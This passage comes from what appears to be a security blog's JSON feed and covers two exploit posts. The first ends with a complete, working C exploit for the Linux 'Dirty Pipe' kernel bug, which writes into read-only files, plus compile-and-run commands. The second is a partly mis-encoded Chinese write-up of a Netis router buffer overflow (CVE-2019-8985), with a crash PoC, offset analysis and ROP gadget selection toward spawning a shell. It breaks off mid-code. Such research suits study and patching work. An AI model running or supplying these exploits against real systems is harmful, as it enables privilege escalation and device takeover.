class=\"keyword\">ifndef</span> PAGE_SIZE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 4096</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class=\"line\"><span class=\"comment\"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">prepare_pipe</span><span class=\"params\">(<span class=\"type\">int</span> p[<span class=\"number\">2</span>])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pipe(p)) <span class=\"built_in\">abort</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">unsigned</span> pipe_size = fcntl(p[<span class=\"number\">1</span>], F_GETPIPE_SZ);</span><br><span class=\"line\">\t<span class=\"type\">static</span> <span class=\"type\">char</span> buffer[<span class=\"number\">4096</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class=\"line\"><span class=\"comment\">\t   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">unsigned</span> r = pipe_size; r &gt; <span class=\"number\">0</span>;) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> n = r &gt; <span class=\"keyword\">sizeof</span>(buffer) ? <span class=\"keyword\">sizeof</span>(buffer) : r;</span><br><span class=\"line\">\t\twrite(p[<span class=\"number\">1</span>], buffer, n);</span><br><span class=\"line\">\t\tr -= n;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class=\"line\"><span class=\"comment\">\t   leaving the flags initialized) */</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">unsigned</span> r = pipe_size; r &gt; <span class=\"number\">0</span>;) &#123;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> n = r &gt; <span class=\"keyword\">sizeof</span>(buffer) ? <span class=\"keyword\">sizeof</span>(buffer) : r;</span><br><span class=\"line\">\t\tread(p[<span class=\"number\">0</span>], buffer, n);</span><br><span class=\"line\">\t\tr -= n;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class=\"line\"><span class=\"comment\">\t   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class=\"line\"><span class=\"comment\">\t   will be mergeable */</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (argc != <span class=\"number\">4</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Usage: %s TARGETFILE OFFSET DATA\\n&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* dumb command-line argument parser */</span></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> path = argv[<span class=\"number\">1</span>];</span><br><span class=\"line\">\t<span class=\"type\">loff_t</span> offset = strtoul(argv[<span class=\"number\">2</span>], <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"type\">const</span> data = argv[<span class=\"number\">3</span>];</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">size_t</span> data_size = <span class=\"built_in\">strlen</span>(data);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (offset % PAGE_SIZE == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot start writing at a page boundary\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class=\"number\">1</span>)) + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">loff_t</span> end_offset = offset + (<span class=\"type\">loff_t</span>)data_size;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (end_offset &gt; next_page) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot write across a page boundary\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* open the input file and validate the specified offset */</span></span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">int</span> fd = open(path, O_RDONLY); <span class=\"comment\">// yes, read-only! :-)</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fd &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;open failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">st</span>;</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;stat failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (offset &gt; st.st_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Offset is not inside the file\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Sorry, cannot enlarge the file\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* create the pipe with all flags initialized with</span></span><br><span class=\"line\"><span class=\"comment\">\t   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> p[<span class=\"number\">2</span>];</span><br><span class=\"line\">\tprepare_pipe(p);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* splice one byte from before the specified offset into the</span></span><br><span class=\"line\"><span class=\"comment\">\t   pipe; this will add a reference to the page cache, but</span></span><br><span class=\"line\"><span class=\"comment\">\t   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class=\"line\"><span class=\"comment\">\t   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class=\"line\">\t--offset;</span><br><span class=\"line\">\t<span class=\"type\">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class=\"number\">1</span>], <span class=\"literal\">NULL</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;splice failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;short splice\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/* the following write will not create a new pipe_buffer, but</span></span><br><span class=\"line\"><span class=\"comment\">\t   will instead write into the page cache, because of the</span></span><br><span class=\"line\"><span class=\"comment\">\t   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class=\"line\">\tnbytes = write(p[<span class=\"number\">1</span>], data, data_size);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (nbytes &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\tperror(<span class=\"string\">&quot;write failed&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((<span class=\"type\">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;short write\\n&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> EXIT_FAILURE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;It worked!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> EXIT_SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc exp.c -o exp --static</span><br><span class=\"line\">./exp file offset string</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Kernel"
            ]
        },
        {
            "id": "https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/",
            "url": "https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/",
            "title": "CVEâ€“2019â€“8985 Netis WF2411 RCE detail",
            "date_published": "2021-08-10T16:00:00.000Z",
            "content_html": "<h2 id=\"ç¯å¢ƒæ­å»º\"><a class=\"markdownIt-Anchor\" href=\"#ç¯å¢ƒæ­å»º\">#</a> ç¯å¢ƒæ­å»º</h2>\n<p>å›ºä»¶è·å–  <a href=\"https://www.netis-systems.com/Suppory/de_details/id/1/de/168.html\">WF2419</a><br>\n<a href=\"https://www.tacnetsol.com/blog/cve-2019-8985-rce\">Fetching Title#sw0w</a><br>\n é€‰æ‹© WF2419ï¼ˆ2.2.36123ï¼‰</p>\n<p>å…ˆé€†å‘åˆ†æ <code>boa</code> <br>\n æ¼æ´ç‚¹</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">loc_4145D8:              <span class=\"meta\"># s</span></span><br><span class=\"line\">addiu   $a0, $sp, <span class=\"number\">0x60</span>+var_40</span><br><span class=\"line\">li      $a1, <span class=\"number\">0x420000</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $a1, (aSS_0 - <span class=\"number\">0x420000</span>)  # <span class=\"string\">&quot;%s:%s&quot;</span></span><br><span class=\"line\">move    $a2, $s0</span><br><span class=\"line\">move    $a3, $s4</span><br><span class=\"line\">la      $t9, <span class=\"built_in\">sprintf</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">jalr    $t9 ; <span class=\"built_in\">sprintf</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">lw      $gp, <span class=\"number\">0x60</span>+var_48($sp)</span><br><span class=\"line\">nop</span><br><span class=\"line\">li      $s3, <span class=\"number\">0x460000</span></span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $s3, (byte_4596D0 - <span class=\"number\">0x460000</span>)</span><br><span class=\"line\">lbu     $v0, <span class=\"number\">0x60</span>+var_40($sp)</span><br><span class=\"line\">nop</span><br><span class=\"line\">addiu   $s2, $v0, <span class=\"number\">-0x3A</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">user_ok</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span> *a1, <span class=\"type\">const</span> <span class=\"type\">char</span> *a2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// $s1</span></span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// $v0</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// $s2</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v7; <span class=\"comment\">// $v0</span></span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">char</span> *v8; <span class=\"comment\">// $s0</span></span><br><span class=\"line\">  <span class=\"type\">bool</span> v9; <span class=\"comment\">// dc</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v10[<span class=\"number\">64</span>]; <span class=\"comment\">// [sp+20h] [-40h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v10, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v10));</span><br><span class=\"line\">  v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( get_password(<span class=\"number\">64</span>) &gt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">sprintf</span>(v10, <span class=\"string\">&quot;%s:%s&quot;</span>, a1, a2);</span><br><span class=\"line\">    v6 = (<span class=\"type\">unsigned</span> __int8)v10[<span class=\"number\">0</span>] - <span class=\"number\">58</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v7 = v4 &lt;&lt; <span class=\"number\">6</span>;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( byte_4596D0[<span class=\"number\">64</span> * v4] == <span class=\"number\">58</span> &amp;&amp; !v6 )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      v8 = &amp;byte_4596D0[v7];</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(&amp;byte_4596D0[v7]) &gt;= <span class=\"number\">2</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        v9 = <span class=\"built_in\">strcmp</span>(v10, v8) == <span class=\"number\">0</span>;</span><br><span class=\"line\">        result = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( v9 )</span><br><span class=\"line\">          <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( ++v4 &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;check password error,log_passwd=%s;passwd=%s\\n&quot;</span>, a2, byte_4596D0);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;%s:%s:%d;get password error!\\n&quot;</span>, <span class=\"string\">&quot;htauth.c&quot;</span>, <span class=\"string\">&quot;user_ok&quot;</span>, <span class=\"number\">74</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>å¯åŠ¨ boa çš„æ—¶å€™å¯ä»¥æ£€æŸ¥ä¸‹é…ç½®æ–‡ä»¶</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">âœ  sqrootfs file bin/busybox         </span><br><span class=\"line\">bin/busybox: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class=\"line\">âœ  sqrootfs cp $(which qemu-mips) .</span><br><span class=\"line\">âœ  sqrootfs grep -r &quot;boa -&quot; .                   </span><br><span class=\"line\">./bin/webs:\t/bin/boa -p /web -f /etc/boa.conf &amp;</span><br><span class=\"line\">grep: ./var/run/webs.pid: Permission denied</span><br><span class=\"line\">âœ  sqrootfs sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br><span class=\"line\">[sudo] password for squ: </span><br><span class=\"line\">Starting Protocol Module: HTTP Server                      ... OK</span><br></pre></td></tr></table></figure>\n<p>å¦‚æœå‡ºç°ä¸èƒ½ç¼ºå¤± <code>/dev/null</code>  çš„é—®é¢˜<br>\nå¯ä»¥ <code>sudo mknod -m 666 dev/null c 1 3</code> <br>\n å¦‚æœå‡ºç° <code>can't create PID file</code> <br>\n å¯ä»¥ <code>md var/run</code></p>\n<p>ç„¶åå¯ä»¥æ‰“ä¸ª PoC è¯•è¯•çœ‹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget --http-user=a --http-password=$(python -c &#x27;print &quot;a&quot;*0x80&#x27;) http://127.0.0.1</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥çœ‹åˆ°æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">translate_uri:222;Wget/1.19.4 (linux-gnu)</span><br><span class=\"line\">translate_uri:254</span><br><span class=\"line\">translate_uri:256</span><br><span class=\"line\">htauth.c:user_auth:181;get password error!</span><br></pre></td></tr></table></figure>\n<p>âœ¨TODO</p>\n<p>é€†å‘ä¸€ä¸‹å¯ä»¥å‘ç°è¦æ‰“å¼€ä¸€ä¸ª passwd</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v2 = fopen(<span class=\"string\">&quot;/tmp/passwd&quot;</span>, <span class=\"string\">&quot;r+&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>cp æœ¬åœ°çš„è¿‡å»</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cp /etc/passwd ./tmp</span><br></pre></td></tr></table></figure>\n<p>åœ¨ wget ä¸€ä¸‹ å¯ä»¥çœ‹åˆ°å´©æºƒ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">check password error,log_passwd=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;passwd=root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">caught SIGSEGV, dumping core in /var/boa</span><br><span class=\"line\">qemu: uncaught target signal 6 (Aborted) - core dumped</span><br><span class=\"line\">[1]    49014 abort      sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf</span><br></pre></td></tr></table></figure>\n<h2 id=\"æ¼æ´åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´åˆ†æ\">#</a> æ¼æ´åˆ†æ</h2>\n<p><code>ra</code>  åœ¨  <code>sp + 0x14</code> <br>\n <code>buf</code>  åœ¨  <code>sp - 0x40</code> <br>\n ä¹Ÿå°±æ˜¯ <code>0x54</code>  çš„ offs<br>\n åŒæ—¶æˆ‘ä»¬ä¹Ÿéœ€è¦æ§åˆ¶äº”ä¸ªå¯„å­˜å™¨ <code>s0 ~ s5</code>  è¿™äº”ä¸ªè°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨<br>\nè¿™äº›å¯„å­˜å™¨ä¸»è¦æ˜¯ä¸ºäº†åŠ«æŒè¿”å›åœ°å€ å› ä¸ºä¼šæœ‰ sx ä¼ é€’ç»™ ax<br>\n ç„¶å jalr ax çš„ gadget</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">004146</span>DC                 lw      $ra, <span class=\"number\">0x60</span>+var_s14($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E0</span>                 lw      $s4, <span class=\"number\">0x60</span>+var_s10($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E4</span>                 lw      $s3, <span class=\"number\">0x60</span>+var_sC($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146E8</span>                 lw      $s2, <span class=\"number\">0x60</span>+var_s8($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146</span>EC                 lw      $s1, <span class=\"number\">0x60</span>+var_s4($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>0                 lw      $s0, <span class=\"number\">0x60</span>+var_s0($sp)</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>4                 jr      $ra</span><br><span class=\"line\">.text:<span class=\"number\">004146F</span>8                 addiu   $sp, <span class=\"number\">0x78</span></span><br></pre></td></tr></table></figure>\n<p>sprintf çš„é€†å‘è¯­å¥å¦‚ä¸‹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sprintf(dest, &quot;%s:%s&quot;, username, password);</span><br></pre></td></tr></table></figure>\n<p><code>boa</code>  has two loaded libraries,  <code>libC</code>  and  <code>libgcc</code> .</p>\n<p>å®¡è§†ä¸€æ³¢ libc.so.0</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">Python&gt;</span><span class=\"language-bash\">mipsrop.stackfinder()</span></span><br><span class=\"line\">----------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class=\"line\">----------------------------------------------------------------------------------------------------------------</span><br><span class=\"line\">|  0x000068AC  |  addiu $a0,$sp,0x20+var_8                            |  jalr  $v0                             |</span><br><span class=\"line\">|  0x0000711C  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class=\"line\">|  0x000074BC  |  addiu $a0,$sp,0x1A0+var_188                         |  jalr  $v0                             |</span><br><span class=\"line\">|  0x00020660  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class=\"line\">|  0x000071E4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class=\"line\">|  0x00008AD4  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class=\"line\">|  0x0000A3CC  |  addiu $a2,$sp,0x40+var_28                           |  jr    0x40+var_sC($sp)                |</span><br><span class=\"line\">|  0x000125E0  |  addiu $a2,$sp,0x18+arg_8                            |  jr    0x18+var_s0($sp)                |</span><br></pre></td></tr></table></figure>\n<p>æ²¡æœ‰å¯ç”¨çš„ gadget<br>\n å†åˆ° libgcc ä¸­æ‰¾ ç¬¬äºŒåˆ—æœ‰ a0 ç¬¬ä¸‰åˆ—æœ‰ s0 ~ s4 å°±è¡Œ<br>\næ‰¾åˆ°è¿™ä¸ª ä¹Ÿå°±æ˜¯è¦ç¡®ä¿</p>\n<ul>\n<li>binsh åœ°å€åœ¨ sp + 0x18 (ä½†è¿™ä¸ªæ˜¯åœ¨æ‰§è¡Œäº† <code>addiu   $sp, 0x78</code>  ä¹‹åçš„)</li>\n<li>è€Œ system åœ¨ s3 ï¼ˆsp + 0xcï¼‰</li>\n<li>ra åœ¨ sp +0x14</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000ABD0                 addiu   $a0, $sp, 0x20+var_8</span><br><span class=\"line\">.text:0000ABD4                 move    $a1, $s2</span><br><span class=\"line\">.text:0000ABD8                 move    $s0, $zero</span><br><span class=\"line\">.text:0000ABDC                 move    $t9, $s3</span><br><span class=\"line\">.text:0000ABE0                 jalr    $t9</span><br><span class=\"line\">.text:0000ABE4                 movz    $s0, $v0, $v1</span><br></pre></td></tr></table></figure>\n<p>åœ¨ qemu å†…æ¨¡æ‹Ÿ</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 